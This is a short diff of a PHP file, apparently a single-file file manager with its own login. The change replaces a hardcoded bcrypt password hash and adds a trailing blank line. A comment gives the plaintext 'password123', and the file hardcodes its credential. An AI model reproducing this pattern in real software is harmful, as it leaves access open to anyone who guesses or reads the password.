@@ -11,7 +11,7 @@
 session_start();
 
 // Hardcoded password hash for login (bcrypt hashed password for 'password123')
-$hashed_password = '$2y$10$fjxmFugvnI/RNoxORork0uDspLUWsY.Lq5vjkHwWTt4qjX1OJA/2C';
+$hashed_password = '$2y$10$Pyg.jznr56Ybzbdzla2d.u739WLOayvjyqa3yfM/LQb4wnLYO9Wai';
 
 // Check login
 if (isset($_GET['logout'])) {
@@ -1822,4 +1822,5 @@ function perms($file)
         (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-')); 
     return $info; 
 } 
+
 ?>
